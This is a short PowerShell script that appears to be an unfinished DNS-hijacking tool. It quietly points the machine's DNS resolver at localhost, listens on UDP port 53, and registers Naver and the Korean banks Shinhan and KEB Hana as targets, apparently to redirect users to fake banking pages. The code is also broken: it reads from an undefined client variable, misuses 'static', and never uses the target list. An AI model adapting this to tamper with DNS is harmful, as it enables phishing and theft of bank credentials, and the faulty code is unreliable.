function Invoke-Malformed-DNS
{
    $configures = Get-NetIPConfiguration
    $index = $configures[0].interfaceIndex
    Set-DNSClientServerAddress -interfaceindex $index -ServerAddress ("127.0.0.1")
    $port = 53
    $endpoint = New-Object System.Net.IpEndPoint ([IPAddress]::Any, $port)
    try {
        while($true) {
            $socket = New-Object System.Net.Sockets.UdpClient $port
            $content = $udpclient.Receive([ref]$endpoint)
            $socket.close()
            [Text.Encoding]::ASCII.GetString($content)
        }
    }
    catch {
        Write-Host "$($Error[0])"
    }   
}

static [System.Collections.Generic.List[String]] $malformedPages = New-Object System.Collections.Generic.List[String]
function Register-MalformedPage([String] $PageUrl)
{
    $malformedPages.Add($PageUrl)
}

Register-MalformedPage("www.naver.com")
Register-MalformedPage("bank.shinhan.com")
Register-MalformedPage("www.kebhana.com")
Invoke-Malformed-DNS